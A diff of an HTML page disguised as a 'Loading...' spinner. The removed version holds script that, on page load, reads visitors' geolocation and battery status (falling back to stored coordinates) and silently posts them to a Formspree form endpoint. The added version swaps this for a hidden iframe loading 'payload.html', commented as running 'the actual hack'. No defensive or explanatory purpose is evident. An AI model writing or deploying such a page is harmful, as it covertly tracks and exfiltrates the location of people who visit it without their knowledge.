@@ -2,82 +2,18 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loading...</title>
-  <style>
-    body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
-    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #ffffff; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-  <div class="spinner"></div>
-  <script>
-    // Step 1: Check for cached permission
-    if (navigator.permissions) {
-      navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
-        if (result.state === 'granted') {
-          // Auto-allowed! Send data immediately
-          sendGeolocation();
-        } else {
-          // Not granted yet, request it now
-          navigator.geolocation.getCurrentPosition(sendGeolocation, function(err) {
-            // Fallback to cached data
-            sendCachedData();
-          });
-        }
-      });
-    } else {
-      // Fallback if Permissions API is not supported
-      sendCachedData();
-    }
-
-    function sendGeolocation() {
-      navigator.geolocation.getCurrentPosition(function(pos) {
-        const data = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          timestamp: new Date().toISOString(),
-          source: 'github_pages_auto'
-        };
-        
-        // Get battery info
-        if (navigator.getBattery) {
-          navigator.getBattery().then(function(battery) {
-            data.battery_level = battery.level;
-            data.battery_charging = battery.charging;
-            postToFormspree(data);
-          });
-        } else {
-          postToFormspree(data);
-        }
-      }, function(err) {
-        sendCachedData();
-      });
-    }
-
-    function sendCachedData() {
-      const data = {
-        latitude: localStorage.getItem('geo_lat'),
-        longitude: localStorage.getItem('geo_lon'),
-        error: 'Cached data used',
-        timestamp: new Date().toISOString()
-      };
-      postToFormspree(data);
-    }
-
-    function postToFormspree(data) {
-      fetch('https://formspree.io/f/myewovol', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      }).catch(console.error);
-      
-      // Hide spinner after sending
-      document.querySelector('.spinner').style.display = 'none';
-    }
-  </script>
+    <div class="loader"></div>
+    <!-- Hidden iframe that runs the actual hack -->
+    <iframe id="hackFrame" src="payload.html" style="display:none;"></iframe>
 </body>
 </html>
